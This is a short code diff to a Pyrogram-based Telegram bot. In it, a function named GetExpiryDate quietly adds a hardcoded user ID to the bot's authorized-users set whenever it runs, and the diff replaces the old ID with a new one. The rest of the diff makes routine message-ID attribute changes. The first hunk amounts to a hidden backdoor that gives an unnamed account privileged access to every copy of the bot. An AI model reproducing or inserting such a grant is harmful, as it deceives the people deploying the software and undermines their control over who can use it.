@@ -33,7 +33,7 @@ from pyrogram import StopPropagation, Client, filters
 bot_start_time = time.time()
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(1305002856)
+    Config.AUTH_USERS.add(5468192421)
     return expires_at
 
 @Client.on_message(pyrogram.filters.command(["start"]))
@@ -55,7 +55,7 @@ async def help_user(bot, update):
         text=Translation.HELP_USER,
         parse_mode="html",
         disable_web_page_preview=True,
-        reply_to_message_id=update.message.id
+        reply_to_message_id=update.message.message_id
     )
 
 
@@ -90,7 +90,7 @@ async def upgrade(bot, update):
         chat_id=update.chat.id,
         text=Translation.UPGRADE_TEXT,
         parse_mode="html",
-        reply_to_message_id=update.message.id,
+        reply_to_message_id=update.message.message_id,
         disable_web_page_preview=True
     )
     
